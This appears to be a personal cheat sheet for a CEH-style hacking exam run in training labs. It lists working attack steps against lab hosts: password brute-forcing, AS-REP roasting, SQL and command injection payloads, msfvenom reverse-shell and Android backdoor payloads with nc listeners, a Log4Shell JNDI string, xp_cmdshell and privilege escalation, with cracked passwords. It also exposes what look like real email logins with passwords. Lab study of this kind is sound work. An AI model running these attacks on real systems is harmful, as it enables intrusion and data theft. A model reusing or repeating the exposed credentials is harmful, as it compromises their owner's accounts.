nikto -h http://target.com -Tuning x (all scans run)
skipfish -o /tmp/skipfish_output http://target.com

-----------------------------------------------------------------------------------------------------------
-perform ldap search on DC machine and find out the latest version of the ldap protocol:

ldapsearch -x -H ldap://192.168.31.105 -D "ad\phil" -W -s base -b "dc=ad,dc=init" supportedLDAPVersion
Answer at dc home is = LDAPv3
sudo apt install ldap-utils

nslookup -type=SRV _ldap._tcp.YOUR_DOMAIN  IR
nmap -p 389,636 --open 192.168.31.0/24 (to find DC)
nmap -p 88,389,636,3268 --open 10.10.10.0/24

*Find base
ldapsearch -H ldap://192.168.31.105 -D "ad\phil" -W -x -s base -b "" "defaultNamingContext"

*perform ldap enumeartion on 10.10.10.0/24 and find how many users account are associated with the domain:

nmap 192.168.31.105 --script=*user*

ldapsearch -H ldap://192.168.31.105 -D "ad\phil" -W -b "dc=ad,dc=init" "(objectClass=user)" sAMAccountName

ldapsearch -H ldap://192.168.31.105 -D "ad\phil" -W -b "dc=ad,dc=init" "(objectClass=user)" sAMAccountName | grep sAMAccountName | wc -l


Script the whole thing: check.sh

for ip in $(nmap -p 389 --open -oG - 10.10.10.0/24 | grep "389/open" | awk '{print $2}'); do
    echo "Checking $ip for users..."
    ldapsearch -H ldap://$ip -D "DOMAIN\username" -W -b "dc=yourdomain,dc=com" "(objectClass=user)" sAMAccountName | grep sAMAccountName | wc -l
done

*Find DC ip via bash script:
for ip in $(nmap -p 88,389,636,3268 --open -oG - 10.10.10.0/24 | grep "open" | awk '{print $2}'); do
    echo "Potential Domain Controller found at $ip"
done

-what is the dns of the DC:
nslookup -type=SRV _ldap._tcp.dc._msdcs.ad.int
dig _ldap._tcp.dc._msdcs.ad.init SRV
ldapsearch -H ldap://192.168.31.105 -D "ad\phil" -W -b "dc=ad,dc=init" "dnsHostName"
#Result: WIN-UCMMADBCI7A, Domain Controllers, ad.init
dn: CN=WIN-UCMMADBCI7A,OU=Domain Controllers,DC=ad,DC=init
dNSHostName: WIN-UCMMADBCI7A.ad.init

Via PS:
(Get-ADDomainController -Discover -DomainName "ad.init").HostName

-----------------------------------------------------------------------------------------------------------
-Crack RDP credential for Maurice on 192.168.10.0/24 via users.txt and rockyou.txt:

nmap -p 3389 192.168.10.0/24 --open
*you can find 2 hosts using rdp so hydra both if no result:
hydra -l Maurice -P rockyou.txt 192.168.10.222 rdp
Pumpkin@1234

Then use Remmina to rdp to target
#remmina (will launch gui...)

-----------------------------------------------------------------------------------------------------------
-Determine the Parent PID of H3ll0.exe from Logfile.PML:
*Copy Logfile.PML from Linux to Windows then analyze the H3ll0.exe
use Procmon.exe from tools provided on windows, do not download...
click on Filter - Process Name - is - H3ll0.exe - Add - ok then double click on the result - 2ND tab (process) for PPID

-----------------------------------------------------------------------------------------------------------
-Intense scanning on 10.10.10.25 and find out fqdn:

nmap -A -T4 10.10.10.25
nmap--script smb-os-discovery 10.10.10.25
nslookup 10.10.10.25
dig -x 10.10.10.25
ldapsearch -H ldap://10.10.10.25 -x -s base -b "" "dnsHostName"

-identify the remote packet capture feature that is enabled to analyse the traffic on the target machine remotetly: 
Scan the target subnets and determine the IP address using rpcap service:

nmap -p 2002 192.168.10.0/24
-----------------------------------------------------------------------------------------------------------

-vulnerability scan of webserver using OpenVas and identify severity level of rpc vulneraibility:

docker run -d -p 443:443 --name openvas mikesplain/openvas
*If already exists
docker ps
docker start openvas
Scans -> Tasks -> New Task
Set the scan type to a full scan or a web application scan depending on the nature of your target.

*Run the Scan - Click on Save and then Start
After the scan completes, go to the Results section and filter for vulnerabilities related to RPC
*Identify any FTP related vulnerability = FTP Unencrypted Cleartext Login
QoD: 70 % for severity level as medium

-----------------------------------------------------------------------------------------------------------
-vulnerability scan of linux on 192.168.10.0/24 via OpenVas and find number of vulnerabilities with severity level as medium:
nmap -A -p 22 --open 192.168.10.0/24

docker run -d -p 443:443 --name openvas mikesplain/openvas
docker start openvas
https://localhost:9392
Scans -> Tasks -> New Task
Set the scan type to a full scan or a web application scan depending on the nature of your target.

*Run the Scan - Click on Save and then Start
After the scan completes, go to the Results section and filter for vulnerabilities related to RPC. You will see a list of findings that could include:
CVE (Common Vulnerabilities and Exposures) related to RPC misconfigurations.
OpenVAS's severity levels, such as Low, Medium, High, or Critical, assigned to each vulnerability.

#Nessus install:
dpkg -i Nessus-10.8.3-ubuntu1604_amd64.deb
systemctl status nessusd
systemctl start nessusd.service
https://machineip:8834


---------------------------------------------------------------------------------------------------------------------
-malware scanning via virustotal and what is the last 4 digits of file SHA-256 hash value:
sha256sum malware.rar
xxxxxxxd282
---------------------------------------------------------------------------------------------------------------------

-Find entropy value of file Tornado, use Cyberchef: and file Tornado to see if ELF file (linux executable)
via https://gchq.github.io/CyberChef/ double click entropy and in Input drop the ELF file.
2.87 (value up to 2 decimals)

OR
apt install ent
ent Tornado

Otherwise DIE on windows:
click on the right Advanced  then Entropy icon will appears in the middle

---------------------------------------------------------------------------------------------------------------------
An insider attack has been identified in one of the employees mobile device in
192.168.0.0/24 subnet. You are assigned to covertly access the users device and obtain
malicious elf files stored in a folder "Scan". Perform deep scan on the elf files and obtain
the last 4 digits of SHA 384 hash of the file with highest entropy value. (Cyberchef for Entropy and or ent cmd linux)

apt install ent
ent Tornado1.elf =2.56
ent Tornado2.elf = 2.75
ent Tornado3.elf = 2.89  (highest entropy)

sha384sum Tornado3.elf

OR

find /mnt/scan -type f -exec file {} + | grep ELF | awk -F: '{print $1}'
*Once ELF file found
import os
import math
import hashlib

def calculate_entropy(file_path):
    with open(file_path, 'rb') as f:
        data = f.read()
        if len(data) == 0:
            return 0
        entropy = 0
        for x in range(256):
            p_x = float(data.count(bytes([x]))) / len(data)
            if p_x > 0:
                entropy += - p_x * math.log2(p_x)
        return entropy

def sha384_last4(file_path):
    with open(file_path, 'rb') as f:
        file_hash = hashlib.sha384(f.read()).hexdigest()
        return file_hash[-4:]

# Directory containing ELF files
directory = "/path/to/your/files"  # Replace with your directory

# Identify ELF files and calculate their entropy
elf_files = [os.path.join(directory, f) for f in os.listdir(directory) if "ELF" in os.popen(f'file "{os.path.join(directory, f)}"').read()]
file_entropies = [(file, calculate_entropy(file)) for file in elf_files]

# Find the file with the highest entropy
max_entropy_file = max(file_entropies, key=lambda x: x[1])[0]

# Compute and print the last 4 digits of its SHA-384 hash
print("File with highest entropy:", max_entropy_file)
print("Last 4 digits of SHA-384 hash:", sha384_last4(max_entropy_file))

*Now run the script: python3 entropy_scan.py

#Viewing and Analyzing ELF Files:

file example.elf
strings example.elf
readelf -a example.elf
objdump -d example.elf
ent example.elf

-----------------------------------------------------------------------------------------------------------
-Misconfgured SQL server vulnerability on DC of client under target domain controller :
(find the file MSS.txt under Public Downloads and determine the size in bytes)

1- Find a MSSQL server on client authentificated to DC: (try other subnet if no Impacket error and could be 2 ms=sql-s on 1433 so try both)
nmap -p 1433 192.168.10.0/24 --open (good mssql)
nmap -p 1433 192.168.0.0/24 --open (wrong ms-sql also DC...+ impacket cmd failed "Encryption Required switching to TLS"

2- hydra -L users.txt -P rockyou.txt 192.168.10.144 mssql (good one)
2- hydra -L users.txt -P password.txt 192.168.10.144 mssql (was giving me user & pwd but when impacket "Encryption Required..."

cd /root/impacket/examples/
python3 /root/impacket/examples/mssqlclient.py SKILL.CEH.com/Server_mssrv:Spidy@192.168.10.144 -port 1433

xp_cmdshell dir c:\users\Public\Downloads
7 Bytes
xp_cmdshell 'whoami'
xp_dirtree
xp_cmdshell type c:\inetpub\wwwroot\issstart.htm
----------------------------------------------------------------------------------------------------
-Analyse / Find domain controller and perform AS-REP roasting attack on users account and find password of vulnerable user:

nmap -A -p 88,389 192.168.10.0/24 --open  (if can't find a dc try another subnet from above questions)
nmap -A -p 88,389 192.168.0.0/24 --open 
nmap -A -p 88,389 172.30.10.0/24 --open

find / -name GetNPUsers.py
(you will see where to execute it from for example)

cd /usr/share/doc/python3-impacket/examples

python3 GetNPUsers.py SKILL.CEH.com/ -usersfile /home/attacker/users.txt -dc-ip 192.168.0.222 -request -format john
*Copy from beginning of username until the end of hash and save it via pluma to roast.txt
Joshua@SKILL.CEH.COM:e73333333333333abdxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

john --wordlist=rockyou.txt roast.txt
c3ll0@123

*If you have a valid account and check which uers does not have pre-authentification on account:
Get-aduser -filter { UserAccountControl -band 4194304}
bitmask value 4194304. Each flag in UserAccountControl has a specific meaning.
4194304 corresponds to DONT_REQ_PREAUTH → "Do not require Kerberos preauthentication."
Save result hashes.txt and use Rubeus to crack the password:

PS c:\.\Rubeus asreproast /user:frank /format:hashcat /outfile:/hashes.txt

hashcat.exe -a 0 -m 18200 -o crack.txt hashes.txt rockyou.txt
start notepad crack.txt (end of file shows password)

https://www.youtube.com/watch?v=zl0v5lYSNlQ

impacket-* should already been installed Otherwise:
cd /opt
sudo git clone GitHub - fortra/impacket: Impacket is a collection of Python classes for working with network protocols.
cd impacket
pip3 install . ← note the space and period at the end

sudo python3 setup.py install
----------------------------------------------------------------------------------------------------

perform vertical privilege escalation:

You used shoulder surfing to identify the username and password of a user on the
Ubuntu machine in the 192.168.0.0/24 network, that is, smith and L1nux123. Access the
target machine, perform vertical privilege escalation to that of a root user, and enter the
content of the imroot.txt file as the answer.

sudo misconfigurations
sudo /bin/bash
sudo -u user2 /bin/bash
sudo -l
su -
sudo su

find / -type f -perm /4000 2>/dev/null
/usr/bin/find . -exec /bin/bash \;
find / -name *.txt -ls 2>dev/null

uname -r for kernel Exploit https://www.exploit-db.com/

find / -type f -perm -0002 2>/dev/null

sudo crontab -l
cat /etc/crontab

ls -l /etc/passwd
cat /etc/passwd

*If any of the system configuration files like /etc/passwd, /etc/sudoers, or others are world-writable or group-writable, 
an attacker can modify them to escalate their privileges.

winPEAS + LinPEAS + LinEnum = wget https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

--------------------------------------------------------------------------
Find The executables Entry point Address: 
A suspicious executable file "malicious-file". Your need to find what is the executable's Entry point (Address). 
-During an assignment, an incident responder has retained a suspicious executable file
"die". Your task as a malware analyst is to find the executable's Entry point
(Address). The file is in the C:\Users\Admin\Documents directory in the "EH Workstation
– 2" machines.

Method 1: Using Detect It Easy (DIE)
Open Detect It Easy (DIE): Launch the DIE application on your machine.

Load the Executable + click on Advanced:

Drag and drop the executable file (e.g., .exe, .dll) into DIE, or use the File > Open menu to load the file.
Locate the Entry Point Address:

After the file loads, DIE will display various sections and metadata about the file.
Look for a section labeled Entry Point or EP. This entry point is the address where the executable’s main code begins executing.

Interpret the Entry Point Address:

DIE: should show the entry point in both virtual memory address and offset format (relative to the start of the file).
The entry point address is typically displayed in hexadecimal format.

Ghidra: Using Ghidra
Open Ghidra and import the executable into a new project.
After analysis, Ghidra will display a "Functions" list. The _entry function or main function is usually near the top.
Right-click the function, select Properties, and look for the Entry Point address.

IDA: Using IDA Freeware or Pro
Open IDA, and load the executable.
IDA will automatically analyze the file and display the Entry Point address in the output window or in the "Segments" pane.

----------------------------------------------------------------------------------------------------------------------------------
Burp Suite: Exploit the web application available at 172.20.0.12 and enter the flag's value at the page with page_id=84

Burp Suite: Use the Spider feature in Burp Suite to crawl the website and capture the request/response for page_id=84. 
This will help you find hidden parameters or possible injection points.
Burp Suite's Intruder function can help in brute-forcing login forms or session cookies.
or
page_id=84 OR 1=1
page_id=84' AND 1=1--
page_id=../../../../etc/passwd
page_id=; ls

SELECT flag FROM flags WHERE page_id=84;

-------------------------------------------------------------------------------------------------------
-Perform vulnerability research and exploit the web application training.cehorg.com : 
available at 192.168.0.64. Locate the Flag.txt file and enter its content as the answer.

-A file named Hash.txt has been uploaded through DVWA
(http://172.20.0.16:8080/DVWA). The file is located in the
“C:\wamp64\www\DVWA\hackable\uploads\” directory. Access the file and crack the
MD5 hash to reveal the original message. Enter the decrypted message as the answer.
You can log into the DVWA using the credentials admin/password.

#DVWA already have login = admin & password= password for reverse shell and cookie

upload shell.php (revshells.com - os -Windows - PHP Ivan Sincek) THEN Execute it via browser http://x.x.x/DVWA/hackable/uploads/shell.php or browse ../
and then nc -lnvp 4444
type hash.txt

# DVWA number of users ? password ?
'or 1=1#    (in DVWA SQL injection you will get user ID)
'UNION SELECT user, password FROM users#   ((in DVWA SQL injection you will get password md5 HASH)

Now go on https://crackstation.net and past md5 HASH to get the pwd or:

john --format=Raw-MD5 --wordlist=~/rockyou.txt hashes.txt
john --format=Raw-MD5 --show hashes
hashcat -a 0 -m 0 hashes.txt /home/attacker/rockyou.txt

'UNION SELECT table_name, NULL FROM information_schema.tables
'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'
'UNION SELECT user, password FROM users#

--------------------------------------------------------------------------
#file upload reverse shell + cmd injection:

https://www.revshells.com + https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

#DVWA already have login = admin & password= password for reverse shell and cookie

upload php-reverse-shell.php (revshells.com - os -Windows - PHP Ivan Sincek) THEN Execute it via browser http://x.x.x.x/DVWA/hackable/uploads/php-reverse-shell.php or browse ../

and then nc -lnvp 4444
if you want netcat to use privileged port like 443 when not root run:
sudo setcap 'cap_net_bind_service=+ep' $(realpath $(command -v nc))

OTHERWISE:

msfvenom -p php/meterpreter/reverse_tcp lhost=172.20.0.10 lport=4444 -o shell.php
msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=192.168.0.227 R> /var/www/html/share/backdoor.apk
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Test.exe
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.31.164 LPORT=1234 -f exe -o blackwindow.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.31.64 LPORT=4444 -f elf -o shell.elf

msfconsole
search php reverse
use exploit/multi/handler (shell reverse tcp)
show options
set lhost 172.25.0.10
run

Now upload shell.php on DVWA once uploaded go to https://192.168.0.222:8080/DVWA/hackable/uploads/ and click on the shell.php to start reverse shell

OTHERWISE:

sqlmap -u http://xxxx/sql/?idxxxxxx=Submit#" --cookie="security=low; PHPSESSIONID=121121212" --dbs
sqlmap -u http://xxxx/sql/?idxxxxxx=Submit#" --cookie="security=low; PHPSESSIONID=121121212" -D wordpress -T wp_users -dump
sqlmap -u http://xxxx/sql/?idxxxxxx=Submit#" --cookie="security=low; PHPSESSIONID=121121212" --os-shell

#Command Injection website input: box to enter ip to Ping a Device on DVWA

8.8.8.8;whoami
127.0.0.1 && net user
127.0.0.1 | systeminfo

8.8.8;phpReverseShell From https://www.revshells.com then via Burpsuite:

Or via Burp - Repeater - Request change below by phpReverseShellFromxxx - click send (Repeater)
nc -lnvp 4444
cat /etc/passwd
uname -a
cat /etc/release
------------------------------------------------------------------------------------------------------------

gobuster dir -u http://192.168.0.222:8080/CEH -w /usr/share/wordlist/general/big.txt
gobuster dir -u http://192.168.0.222:8080/DVWA /usr/share/wordlist/general/big.txt
gobuster dir -u http://192.168.0.222:8080 /usr/share/wordlist/general/big.txt

*you can try other wordlist ...and check /robots.txt (some juicy stuff)
cd /usr/share/wordlist/

dirb http://192.168.0.222:8080/DVWA -f (-f only show 200 and good code and default word lit embedded usually good)
dirb http://192.168.31.1 /usr/share/wordlists/dirb/vulns/iis.txt -f -o dirb-result.txt

google: sqli cheat sheet github = https://github.com/payloadbox/sql-injection-payload-list

------------------------------------------------------------------------------------------------------------
# vulnerability Linux server port 8080 (could be Log4J / WAMP) exploit and access RootFlag.txt : 
  
nmap -A -p 22,8080 172.30.10.0/24 --open  (last HOP = ip not first Hop 1 IP)
(find Apache Tomcat / Coyote JSP = log4J vunlerable)
http://172.30.10.99:8080
whatweb http://172.30.10.99:8080 (will show Java + JSESSIONID so log4j probably)

"replace jdk version to match the one required": read README file...show nc port....
cd /home/attacker/log4j-shell-poc

Go to Oracle.com / search for 8u20 (Whole Words in Search):
download jdk-8u20-linux-x64.tar.gz
Download, search for 8u20 (Whole Words in Search)
philippe.henry75@gmail.com
Zarma2020$

mv jdk-8u20-linux-x64.tar.gz /home/attacker/log4j-shell-poc
tar -xf jdk-8u20-linux-x64.tar.gz

"open terminal tab - other window":
nc -lvp 9001
other TAB:
python3 poc.py --userip 172.30.25.attackerip --webport 8000
"copy the result to the username box:"
${jndi:ldap://172.30.25.attackerip:1389/a}
Password = password
ls
cat RootFlag.txt
Ch@mp2022

*Otherwise download the docker image and don't forget space . : docker build -t log4j-shell-poc .
docker run --network host log4j-shell-poc
-------------------------------------------------------------------------------------------------------

-There is a machine running wamp server in the subnet. Provide the IP address of the server:
While investigating an attack, you found that a Windows web development environment was exploited to the system. 
Perform extensive scanning and service enumeration of the target networks and identify the IP address of WampServer

nmap -A -p 8080 --open 192.168.1.0/24
nmap -p 80,443,8080 -sC -sV --open 192.168.1.0/24

-------------------------------------------------------------------------------------------------------
-File webpen.txt on 192.168.10.101, use SMB:

hydra -L users.txt -P rockyou.txt 192.168.10.101 smb
username=Martin,password=qwerty1234

Open it via Explorer smb://192.168.10.101 go to Users - Martin - Music

Or:
mkdir /mnt/smb
mount -t cifs //192.168.10.101/users /mnt/smb/ -o username=Martin,password=qwerty1234
cd /mnt/smb
find /mnt/smb -name "webpen.txt"
cat /mnt/smb/Martin/Music/webpen.txt (highlited = the site with "www.moviescope.com") 
so browse the site and F12 to view-source:http://www.x.com
*Find the Meta-Author = F12 dev mode EC-Council:
you can also try via explorer - smb://192.168.10.101

-------------------------------------------------------------------------------------------------------------
-Identify the machine with smb enabled. Crack the smb credentials for the username given.:

Crack the SMB credentials for user Henry and obtain Sniff.txt file containing an encoded secret. 
Decrypt the encoded secret and enter the decrypted text as the answer. Note Use Henry’s password to decode the text

nmap -p 445 --open 192.168.1.0/24
hydra -L users.txt -P rockyou.txt 192.168.1.X smb
Martin/qwerty1234  (You can then also use Explorer on Parrot and smb://192.168.1.X)
mkdir /mnt/smb
mount -t cifs //192.168.1.X/users/martin /mnt/share -o user=Martin,password=qwerty1234
cd /mnt/smb
ls
find /mnt/smb/ -name "webpen.txt"
result, /mnt/smb/Martin/Music/webpen.txt
cat /mnt/smb/Martin/Music/webpen.txt (highlited = the site with "") so browse the site and F12 to view-source:http://www.x.com
*Find the Meta-Author = F12 dev mode EC-Council:

medusa -h 192.168.1.X -u username -P /path/to/wordlist.txt -M smb
python3 /path/to/secretsdump.py -just-dc-ntlm smb://192.168.1.X  (to extract the hash of SMB credentials and then crack them)
smbclient //192.168.1.X/share -U username
mount -t cifs //192.168.1.X/share /mnt/share -o user=username,password=password
net view /domain 
smbclient -L //192.168.1.X -U guest

-------------------------------------------------------------------------------------------------------
-Identify the type of encoding or encryption used on a file + find type of HASH:

hashid hidden_text.txt
cat hidden_text.txt
file hidden_text.txt
ent hidden_text.txt
xxd hidden_text.txt | head -n 20
binwalk hidden_text.txt

-------------------------------------------------------------------------------------------------------
Steganography:

*If you have passwd - steghide on parrot:
steghide extract -sf cover.jpeg -p azerty@123
extarct to hidden.txt
cat hidden.txt

-to encrypt secret.txt and add secret / blank space
SNOW.EXE -C -m "062014" -p "pa$$word" secret.txt hiddensecret.txt
-to decrypt message
SNOW.EXE -C -p "pa$$word" hiddensecret.txt

Image.jpg find details, info:

exiftool Image.jpg

sgpt --shell "Use steghide to extract hidden text in photo.jpg image file"

-------------------------------------------------------------------------------------------------------
#openstego gui windows decrypt (images with hidding message)
#Decode ciphers: ceasar ciphers ....
https://rot13.com/ 
echo "CVPLKDSAsdsd{P7E15asdasdas}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'  ()
https://10015.io/tools/md5-encrypt-decrypt
https://10015.io/tools/base64-encoder-decoder
https://10015.io/tools/url-encoder-decoder

-------------------------------------------------------------------------------------------------------
#BCTEXTENCODER for encryption & decryption
-BcTextEncoder: For encoding / decoding text in file .hex
Put in Encode the key then click on Decode and put the pwd given

# Check for Base64
base64 --decode yourfile
echo cGlJ0taxxxxxx | Base64 -d (decode base64)

# Check for hex
xxd -r -p yourfile.hex

-------------------------------------------------------------------------------------------------------
-Access an encrypted file and decode the encrypted file to retrieve the flag:
Identify the Encryption Type Before you can decode the file, Common encryption types include

AES (Advanced Encryption Standard)
DES (Data Encryption Standard)
RSA (Asymmetric encryption)
Base64 encoding (for simple obfuscation)

file encrypted_file
xxd encrypted_file
strings encrypted_file

*Attempt Decryption:

openssl enc -d -aes-256-cbc -in encrypted_file -out decrypted_file -pass pass:yourpassword
openssl rsautl -decrypt -inkey private_key.pem -in encrypted_file -out decrypted_file
base64 -d encrypted_file > decoded_file

*Brute-forcing or Cracking the Key:

john --format=zip encrypted_file.zip
john ~/Documents/hashes.txt --format=NT --wordlist ~/Desktop/Wordlist/password.txt

cat decrypted_file | grep -i "flag"

-------------------------------------------------------------------------------------------------------------------
Find out the Password: 10.10.10.25

Lophtcrack

L0phtCrack -> Password Auditing wizard -> Next -> Next -> A Remote machine -> Host(ip) -> Use specific user credentials 
-> Username (Administrator), Password (given) -> Next -> ~~~ -> finish
-------------------------------------------------------------------------------------------------------------------

To found data from malware face.exe:

BinText
-------------------------------------------------------------------------------------------------------------------
To perform windows service monitoring & find out the service type "afunix":

Get-WmiObject Win32_Service -Filter "Name='Spooler'" | Select-Object Name, ServiceType

Name    ServiceType
----    -----------
Spooler Own Process

Get-WmiObject Win32_Service -Filter "Name='BthAvctpSvc'" | Select-Object Name, ServiceType

Name        ServiceType
----        -----------
BthAvctpSvc Share Process
-------------------------------------------------------------------------------------------------------------------
To perform DHCP starvation attack. find the transaction ID of the DHCP discover packets:

sudo tcpdump -i eth0 -v

yersinai -G Launch attack --> DHCP --> sending Discover packet --> OK
-------------------------------------------------------------------------------------------------------------------
To analyse and find out the protocol used for sniffing on its network:

Use filter and search arp
-------------------------------------------------------------------------------------------------------------------
To analyze packet id that uses ICMP protocol:

use filter and search icmp in wireshark

Then see the info field there you have an id.
-------------------------------------------------------------------------------------------------------------------
To find the length of the data in UDP packet:

Use filter udp

and search the data
-------------------------------------------------------------------------------------------------------------------
To determine the no of machines used to initiate the attack: 3

Wireshark - conversations, DDOS — ipv4

-------------------------------------------------------------------------------------------------------------------
Suspects of a possible Session hijacking attack on a machine. Find out the protocol used to sniffing the network:

Use filter ARP
-------------------------------------------------------------------------------------------------------------------
To perform web crawling on the web application example.com and identify the no of live png files in image folder:

curl http://example.com/ | grep .png | wc -l
curl -vv http://example.com/ | grep .png | wc -l

-------------------------------------------------------------------------------------------------------------------
Perform command injection on 10.10.10.25 and find out how many user accounts are registered with the machine: 8

Step 1: open browser and search 10.10.10.25:8080

Step 2: select command injection

Step 3: Enter "127.0.0.1 && net user" (in ping a device)

-------------------------------------------------------------------------------------------------------------------
A file named hash.txt has been upload through DVWA http://10.10.10.25:8080/DVWA Note: Username- admin; Password- password 
Path= C:\wamp64\www\DVWA\hackable\uploads\Hash.txt (Hint Use type command to view the file):
Use the following link to decrypt the hash- https://hashes.com/en/decrypt/hash

{% embed url="https://hashes.com/en/decrypt/hash" %}Cr@ck3d
https://crackstation.net

-------------------------------------------------------------------------------------------------------------------
You are assigned a task to perform security audit on the:
mobile application and find out whether the application using permission to Read-call-logs:

https://sisik.eu/apk-tool (to analyse APK file - drag and drop)

-------------------------------------------------------------------------------------------------------------------
AES-Tool to decrypt file.aes:

https://www.devglan.com/online-tools/aes-encryption-decryption

-------------------------------------------------------------------------------------------------------------------
shodan.io: identify whether the message belongs to SCADA/ICS/IoT systems in US:

> IoT

melo92i = phenry@commmmm.com
4#WKiQkXdx%9E3k

-------------------------------------------------------------------------------------------------------------------
There is an Android device in the subnet. Identify the device. Get the files in scan folder:

nmap -p 5555 192.168.10.0/24
Connect the Android device via USB and run the following (adb tcpip 5555) or if not possible adb via PhoneSploit
adb connect 192.168.1.15:5555
adb shell
ls
cd sdcard
ls
cd Download
exit

find /sdcard/ -name "*.png"  (screenshot)
find /sdcard/ -name "*.txt"
find /sdcard/ -name "*.jpeg"

adb pull /sdcard/Download /home/attacker (will download all files in Download and will copy folder to /home/attacker/Download
*copy it via smb://172.25.0.11 by browsing first so it's mounted & decode it via BcTextEncoder on windows
(ryptD3(0d3
Otherwise:
cat encode.txt (copy even strange character ?? and save it to share drive & decode it via BcTextEncoder on windows
BcTextEncoder - in bottom - Encoded text - copy content above - click Decode - Enter password - Decode plain text = ok

adb pull /sdcard/scan /home/to/local/directory
apt install ent (or copy it to parrot and use cyberchef)
ent evil.elf
sha384sum evil.elf

find file in adb:
adb shell ls -lR | grep secret.txt 
adb shell ls -lR | find "secret"
--------------------------------------------------------------------------------------------------------------------------

Perform the vulnerability scan for the given IP address 192.168.39.99:
nmap -sV 192.168.39.99 -oN nmapsV.txt
nmap --script vuln 192.168.39.99 -oN nmapScript.txt

OpenVas & Nessus & OWASP
--------------------------------------------------------------------------------------------------------------------------

What is the severe value of a vulnerability that indicates the end of life for a web development language platform:
PHP, Ruby on Rails, or Node.js, if the version being used is no longer supported, the lack of ongoing security updates creates a high-risk situation.
version:

Exploit a remote login application on a Linux target in the given subnet to access a sensitive file:

nmap -sV -p 22 192.168.X.X --open  # Replace with the target IP address
hydra -l martin -P /path/to/rockyou.txt ssh://192.168.X.X
ssh martin@192.168.X.X
cd Desktop
type secret.txt  (like cat but on windows = type)

hydra -l username -P /path/to/wordlist telnet://192.168.X.X

exploit via metasploit:
msfconsole
use exploit/linux/ssh/your_exploit_here
set RHOST 192.168.X.X
set RPORT 22
exploit

or

scp username@192.168.X.X:/path/to/sensitive_file /local/destination
cat /path/to/sensitive_file

find / -type f -perm -4000 2>/dev/null
-----------------------------------------------------------------------------------------------------------

-Perform a vulnerability scan for the host with IP address 172.20.0.16:
What is the severity score of a vulnerability the indicates the End of Life of a web development language platform?

start openvas - scan

-----------------------------------------------------------------------------------------------------------
-Determine the UDP based application layer protocol the attacker use to flood the server via Wireshark:
(check target destination port = 80)
Application Layer Flood Attack
denial-of-service (DoS) attack

-identify the severity level/potential impact of the attack performed in Wireshark: 
(perform deep down Expert Info analysis). (Format: Aaaaaaa) = Warning
1. Open Expert Information via Wireshark

Go to Analyze → Expert Information.
This opens a window with all “Expert Info” items categorized.

2. Understand the Severity Levels

Wireshark assigns each event a level:

Error (red) → Likely indicates broken communication (e.g., malformed packets, protocol violations).

Warning (orange) → Something unusual but not fatal (e.g., retransmissions, bad checksums).

Note (yellow) → Informational hints (e.g., protocol preferences, potential misconfigurations).

Chat (blue) → General diagnostic info, often harmless.
-----------------------------------------------------------------------------------------------------------
Exploit weak credentials of FTP on Linux via brute-force attack on subnet 192.168.10.0/24. Obtain the hidden file: 

Exploit weak credentials used for FTP service on a Windows machine in the 192.168.0.0/24 subnet. 
Obtain the file, Credentials.txt, hosted on the FTP root, and Enter its content as the answer.

nmap -p 21 -sV 192.168.10.0/24 --open

hydra -l nick -P /path/to/rockyou.txt ftp://192.168.10.111
ftp
open 192.168.10.111
nick
apple
dir
cd Desktop
dir
get w_domain.txt -
("id": "7867721010")
get 52012.py -
(vendore Homepage = https://www.crushftp.com/)

-----------------------------------------------------------------------------------------------------------
Escalate privilege on a Linux machine. User-level credentials are given.10. Find a file entry point. File is given1:

How to Find a File Entry Point
1-For PE (Windows Executables)
Tool: PEiD, CFF Explorer, PEview, or objdump

Steps: Open the .exe or .dll file in the tool.

Look for: AddressOfEntryPoint in the Optional Header
ImageBase (base load address)
Entry point address in memory = ImageBase + AddressOfEntryPoint

Example in PEview:

yaml
Copy
Edit
Optional Header:
  AddressOfEntryPoint: 0x0000B4A0
  ImageBase: 0x00400000
Entry Point (RVA) = 0x0040B4A0

2-For ELF (Linux Executables)
Tool: readelf, objdump, or rabin2 (from Radare2)

Command:

bash
Copy
Edit
readelf -h file.elf | grep "Entry point address"
Output example:

arduino
Copy
Edit
Entry point address: 0x8048320
This tells you where execution starts when the binary is loaded.

3-Using a Disassembler / Debugger
If you need to actually inspect the instructions at the entry point:
IDA Pro, Ghidra, or Radare2: Automatically parse the binary and take you to the entry point.
x64dbg / OllyDbg: Load the executable → Execution stops at entry point → You can see first instructions.

-----------------------------------------------------------------------------------------------------------
You are provided a username/password for a website. Use SQL Injection attack to extract the password of another user:
Perform the SQL injection attack on your target web application cinema.cehorg.com and extract the password of a user Sarah. 
You have already registered on the website with credentials Karen/computer.

sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" --dbs
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" -D moviescope -tables
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" -D moviescope -T User_Login -dump
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" --os-shell

wpscan --usernames sara -P password.txt --url http://192.168.0.222:8080/CEH/
wpscan --url http://192.168.0.222:8080/CEH/ --passwords /home/rockyou.txt
wpscan --url http://192.168.0.222:8080/CEH/ -e u --passwords /home/rockyou.txt

-----------------------------------------------------------------------------------------------------------
Analyze IoT traffic. Identify the packet with the publish message and enter the length or % humidity:

Filter for MQTT: Type mqtt in the filter bar.
Find Publish Messages: Look for Publish Message - Info of the packet
*Double click on packet with info High_humidity and it will show % of the alert: 50
Check the Length: In the Frame section of the packet details, check the length of the packet.

-----------------------------------------------------------------------------------------------------------
Crack the weak credentials of wifi from a pcap file:
filter packets using the Wireshark filter = eapol
aircrack-ng yourfile.pcap

*Convert the Handshake to a Readable Format
aircrack-ng -w /path/to/wordlist.txt yourfile-01.cap

hashcat -m 2500 -a 0 -w 3 yourfile.hccapx /path/to/wordlist.txt
